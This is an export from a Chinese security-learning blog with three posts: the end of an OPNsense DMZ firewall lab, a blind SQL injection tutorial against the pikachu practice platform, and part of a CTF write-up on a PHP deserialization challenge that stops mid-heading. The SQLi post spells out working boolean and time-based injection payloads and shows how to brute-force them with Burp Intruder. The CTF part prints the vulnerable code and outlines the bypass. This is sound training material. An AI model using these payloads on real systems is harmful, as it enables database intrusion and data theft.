fa-link"></i></a>2.5 三台机器IP以及默认网关配置</h3>      <p>默认网关配置对应的同一虚拟网络防火墙接口IP</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winXP(inside):</span><br><span class="line">ip地址：192.168.64.135</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网关：192.168.64.131</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win2003(outside):</span><br><span class="line">ip地址：100.1.1.2</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网关：100.1.1.1</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win2008(DMZ):</span><br><span class="line">ip地址：172.16.1.1</span><br><span class="line">子网掩码：255.255.255.0</span><br><span class="line">默认网关：172.16.1.254</span><br></pre></td></tr></table></div></figure>        <h3 id="2-6-防火墙规则配置">          <a href="#2-6-防火墙规则配置" class="heading-link"><i class="fas fa-link"></i></a>2.6 防火墙规则配置</h3>              <h4 id="2-6-1-inside规则配置">          <a href="#2-6-1-inside规则配置" class="heading-link"><i class="fas fa-link"></i></a>2.6.1 inside规则配置</h4>      <p>inside可以访问dmz区域，同时可以访问outside区域。</p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.1.1.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.1.2.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.1.3.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.1.4.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.1.5.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.1.6.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.1.7.png"></p>        <h4 id="2-6-2-dmz规则配置">          <a href="#2-6-2-dmz规则配置" class="heading-link"><i class="fas fa-link"></i></a>2.6.2 dmz规则配置</h4>      <p>dmz可以访问outside区域，但是不可以访问inside区域。</p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.2.1.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.2.2.png"></p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/2.6.2.3.png"></p>        <h4 id="2-6-3-outside规则配置">          <a href="#2-6-3-outside规则配置" class="heading-link"><i class="fas fa-link"></i></a>2.6.3 outside规则配置</h4>      <p>outside区域不做配置，默认阻拦一切对外Internet访问。</p>        <h2 id="3-实验结果">          <a href="#3-实验结果" class="heading-link"><i class="fas fa-link"></i></a>3. 实验结果</h2>              <h3 id="3-1-对于win-XP">          <a href="#3-1-对于win-XP" class="heading-link"><i class="fas fa-link"></i></a>3.1 对于win XP</h3>      <p>win xp 可以访问 win server2008和win server2003。</p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/3.1.png"></p>        <h3 id="3-2-对于win-server2008">          <a href="#3-2-对于win-server2008" class="heading-link"><i class="fas fa-link"></i></a>3.2 对于win server2008</h3>      <p>win server2008可以访问win server2003,但是不能访问win XP。</p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/3.2.png"></p>        <h3 id="3-3-对于win-server2003">          <a href="#3-3-对于win-server2003" class="heading-link"><i class="fas fa-link"></i></a>3.3 对于win server2003</h3>      <p>win server2003无法访问win XP和win server2008。</p><p><img src="/2021/02/06/OPNsense%E7%9A%84DMZ%E5%8C%BA%E9%85%8D%E7%BD%AE/3.3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FireWall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&#39;SQL注入之盲注&#39;</title>
      <link href="2020/12/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/"/>
      <url>2020/12/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="SQL注入之盲注">          <a href="#SQL注入之盲注" class="heading-link"><i class="fas fa-link"></i></a>SQL注入之盲注</h1>      <p>在我们注入语句被带入数据库查询单却社么都没有返回的情况下我们该怎么办？例如应用程序就会返回一个”通用的” 的页面，或者重定向一个通用页面（可能为网站首页），这时，我们之前学习的 SQL 注入办法就无法使用了。</p><p>盲注：即在 SQL 注入过程中，SQL 语句执行选择后不能回显到前端，页面无回显数据信息，或者回显的信息是true或者false，这时我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。</p><a id="more"></a><p>盲注的分类：</p><ol><li>基于布尔型盲注</li><li>基于时间盲注</li><li>基于报错型盲注</li></ol><p>测试平台：pikachu</p>        <h2 id="1-常用函数介绍">          <a href="#1-常用函数介绍" class="heading-link"><i class="fas fa-link"></i></a>1. 常用函数介绍</h2>              <h3 id="1-1-length-函数">          <a href="#1-1-length-函数" class="heading-link"><i class="fas fa-link"></i></a>1.1 length()函数</h3>      <p>计算字符串长度</p>        <h3 id="1-2-substr-函数">          <a href="#1-2-substr-函数" class="heading-link"><i class="fas fa-link"></i></a>1.2 substr()函数</h3>      <p>substr(string,start,length)</p><p>string(必需)规定要返回其中一部分的字符串，start(必需)规定在字符串的何处开始，length(可选，默认为1)规定被返回字符串的长度。</p><p>例如：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">substr(database(),1,1)</span><br><span class="line">#这里的后面第一个1意思是字符串第一个字符开始</span><br><span class="line">#第二个1是要截取的长度，如果这里不填，默认就是1</span><br><span class="line">#加起来就是要截取database（）的第一个字符</span><br><span class="line">#如果要查第二个字符就是substr(database(),2,1)</span><br></pre></td></tr></table></div></figure>        <h3 id="1-3-ascii-函数">          <a href="#1-3-ascii-函数" class="heading-link"><i class="fas fa-link"></i></a>1.3 ascii()函数</h3>      <p>求得字符的ascii值</p>        <h3 id="1-4-count-函数">          <a href="#1-4-count-函数" class="heading-link"><i class="fas fa-link"></i></a>1.4 count()函数</h3>      <p>求个数，例如count(database())=</p>        <h3 id="1-5-sleep-函数">          <a href="#1-5-sleep-函数" class="heading-link"><i class="fas fa-link"></i></a>1.5 sleep()函数</h3>      <p>使得页面延迟访问，单位秒</p>        <h3 id="1-6-if-语句1，执行1，执行2-语句">          <a href="#1-6-if-语句1，执行1，执行2-语句" class="heading-link"><i class="fas fa-link"></i></a>1.6 if(语句1，执行1，执行2)语句</h3>      <p>if()函数里面写三句话，语句1成立就执行1，不成立就执行2</p><p>格式：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(语句1,sleep(10),null)</span><br><span class="line">#语句1如果成立的话，执行页面延迟10秒，否则立刻执行无延迟</span><br></pre></td></tr></table></div></figure>        <h3 id="1-7-limit-的简介">          <a href="#1-7-limit-的简介" class="heading-link"><i class="fas fa-link"></i></a>1.7 limit 的简介</h3>      <p>limit 子句可以被用于强制 select 语句返回指定的记录数。<br>limit 接受一个或两个数字参数，参数必须是一个整数常量。<br>如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。</p><p>初始记录行的偏移量是 0(而不是 1)。</p><p>也就是从第几行开始，然后返回几行，第一行是0而不是1，所以limit查询第一行开始的话第一个常量为0.</p>        <h2 id="2-Boolian（布尔型）盲注">          <a href="#2-Boolian（布尔型）盲注" class="heading-link"><i class="fas fa-link"></i></a>2. Boolian（布尔型）盲注</h2>              <h3 id="2-1-判断当前数据库长度">          <a href="#2-1-判断当前数据库长度" class="heading-link"><i class="fas fa-link"></i></a>2.1 判断当前数据库长度</h3>      <p>首先我们得知道一个正确的id，这里我们知道的是vince，没有的话无论如何都无法让页面返回正确的信息。</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vince&#39; and length(database())&lt;1&#x2F;2&#x2F;3&#x2F;4...#</span><br><span class="line">#判断数据库长度</span><br><span class="line">#除了用&lt;号，也可以用&#x3D;，都是一个道理</span><br></pre></td></tr></table></div></figure><p>当&lt;8的时候显示正常的信息；当&lt;7的时候显示不存在该用户，说明该数据库名称长度为7</p><p><img src="/2020/12/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/2.1.1.png"></p><p><img src="/2020/12/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/2.1.2.png"></p>        <h3 id="2-2-判断数据库名">          <a href="#2-2-判断数据库名" class="heading-link"><i class="fas fa-link"></i></a>2.2 判断数据库名</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vince&#39; and ascii(substr(database(),1,1))&#x3D;112#</span><br><span class="line">vince&#39; and substr(database(),1,1)&#x3D;&#39;p&#39;#</span><br></pre></td></tr></table></div></figure><p>在爆破字符串的时候可以借助Burpsuite</p><p>例如：利用第二条注入语句</p><p>利用Burp抓包，抓到的页面放到 Intruder中</p><p><img src="/2020/12/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/2.2.1.png"></p><p>设置payload</p><p><img src="/2020/12/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/2.2.2.png"></p><p>然后右上角有start attack进行爆破</p><p><img src="/2020/12/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/2.2.3.png"></p><p>通过看不同的length可以判断正确结果会是P或者p，因为我们是改变URL中的参数，而URL中的访问参数是不分大小写的</p><p>然后后面的查询都可与利用同样的方法了。</p><p>最后我们得到的数据库名：pikachu</p>        <h3 id="2-3-查询数据表个数">          <a href="#2-3-查询数据表个数" class="heading-link"><i class="fas fa-link"></i></a>2.3 查询数据表个数</h3>      <p>上面我们已经知道了数据库名，就可以利用数据库名作为判断依据</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vince&#39;and (select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;)&#x3D;1&#x2F;2&#x2F;3&#x2F;4&#x2F;5...# </span><br><span class="line">#利用count（）函数来判断数据表的个数，5的时候没有报错</span><br></pre></td></tr></table></div></figure>        <h3 id="2-4-查询第一个表名的长度">          <a href="#2-4-查询第一个表名的长度" class="heading-link"><i class="fas fa-link"></i></a>2.4 查询第一个表名的长度</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vince&#39;and length(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; limit 0,1),1))&#x3D;8# </span><br><span class="line"># 8的时候没有保错</span><br></pre></td></tr></table></div></figure>        <h3 id="2-5-查询第一个表名的第一个字母">          <a href="#2-5-查询第一个表名的第一个字母" class="heading-link"><i class="fas fa-link"></i></a>2.5 查询第一个表名的第一个字母</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vince&#39;and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; limit 0,1),1,1))&#x3D;104#</span><br><span class="line">或者</span><br><span class="line">vince&#39;and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; limit 0,1),1))&#x3D;104#</span><br></pre></td></tr></table></div></figure><p><strong>查询第一个表名的第二个字母：</strong></p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vince&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; limit 0,1),2,1))&#x3D;116#     </span><br></pre></td></tr></table></div></figure><p><strong>下面的查询字段名或者字段内容都是一个原理。</strong></p>        <h2 id="3-Base-on-time-时间型-盲注">          <a href="#3-Base-on-time-时间型-盲注" class="heading-link"><i class="fas fa-link"></i></a>3. Base on time(时间型)盲注</h2>      <p><strong>原理</strong>：时间型盲注的特点是通过看页面访问时延迟来判断注入查询的是否正确。</p>        <h3 id="3-1-判断是否存在时间注入">          <a href="#3-1-判断是否存在时间注入" class="heading-link"><i class="fas fa-link"></i></a>3.1 判断是否存在时间注入</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vince&#39; and sleep(10)#</span><br></pre></td></tr></table></div></figure><p><img src="/2020/12/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/3.1.1.png"></p>        <h3 id="3-2-判断当前数据库长度">          <a href="#3-2-判断当前数据库长度" class="heading-link"><i class="fas fa-link"></i></a>3.2 判断当前数据库长度</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vince&#39;and if(length(database())&#x3D;7,sleep(10),null)#</span><br></pre></td></tr></table></div></figure><p><img src="/2020/12/22/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/3.2.1.png"></p><p><strong>它的拼接语句和 布尔型的有点类似，差不多就是多了个 if 的判断条件，从而利用 sleep 来判断是否正确，剩余的语句都是一个原理，举一反三。</strong></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
      <link href="2020/11/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/"/>
      <url>2020/11/16/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-网页源码">          <a href="#1-网页源码" class="heading-link"><i class="fas fa-link"></i></a>1. 网页源码</h2>      <p>有题目可得这题是一道php反序列化</p><p>网页代码</p><a id="more"></a><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h2 id="2-思路">          <a href="#2-思路" class="heading-link"><i class="fas fa-link"></i></a>2. 思路</h2>      <p>抛去<code>FileHandler</code>这个类，看最下面首先出现的是get一个参数str</p><figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="2-1-is-valid-函数">          <a href="#2-1-is-valid-函数" class="heading-link"><i class="fas fa-link"></i></a>2.1 is_valid()函数</h3>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>这个函数的意思是判断输入的字符要是ASCII值在32-125之间，该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true，如果不是，就进行返回错误</p><p>而上面的语句是get一个参数str，要每个字符都要可以打印，否则反序列化</p>        <h3 id="2-2-FileHandler类">          <a href="#2-2-FileHandler类" class="heading-link"><i class="fas fa-link"></i></a>2.2 FileHandler类</h3>              <h4 id="2-2-1-析构函数-destruct">          <a href="#2-2-1-析构函数-destruct" class="heading-link"><i class="fas fa-link"></i></a>2.2.1 析构函数 __destruct()</h4>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure><p>因为上面的process()函数要分析op的值，这里op使用强类型比较<code>===</code>判断this-&gt;op的值是否等于<strong>字符串2</strong>，如果等于，则将其置为1。之后执行<code>process()</code>方法。</p>        <h4 id="2-2-2-process-函数">          <a href="#2-2-2-process-函数" class="heading-link"><i class="fas fa-link"></i></a>2.2.2 process()函数</h4>      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure><p>在<code>process()</code>方法中，则使用弱类型比较<code>==</code>判断op的值是否对等于字符串2，若为真，则执行<code>read()</code>方法与<code>output()</code>方法。而read方法中，使用<code>file_get_contents()</code>函数来读取属性filename路径的文件</p>        <h2 id="3-构建exp">          <a href="#3-构建exp" class="heading-link"><i class="fas fa-link"></i></a>3. 构建exp</h2>              <h3 id="3-1-绕过">          <a href="#3-1-绕过" class="heading-link"><i class="fas fa-link"></i></a>3.1 绕过</h3>              <h4 id="3-1-1-绕过op：">          <a href="#3-1-1-绕过op：" class="heading-link"><i class="fas fa-link"></i></a>3.1.1 绕过op：</h4>      <p>如果op===”2”，将其赋为”1”，同时content赋为空，进入process函数，需要注意到的地方是，这里op与”2”比较的时候是强类型比较，进入process函数后，如果op==”1”，则进入write函数，若op==”2”，则进入read函数，否则输出报错，可以看出来这里op与字符串的比较变成了弱类型比较==；</p><p>所以我们利用弱类型绕过，只要令op=2,这里的2是整数int。当op=2时，op===”2”为false，op==”2”为true，接着进入read函数</p>        <h4 id="3-1-2-绕过filename">          <a href="#3-1-2-绕过filename" class="heading-link"><i class="fas fa-link"></i></a>3.1.2 绕过filename</h4>      <p>filename是我们可以控制的，接着使用file_get_contents函数读取文件，我们此处借助php://filter伪协议读取文件，获取到文件后使用output函数输出</p>        <h4 id="3-1-3-绕过is-valid">          <a href="#3-1-3-绕过is-valid" 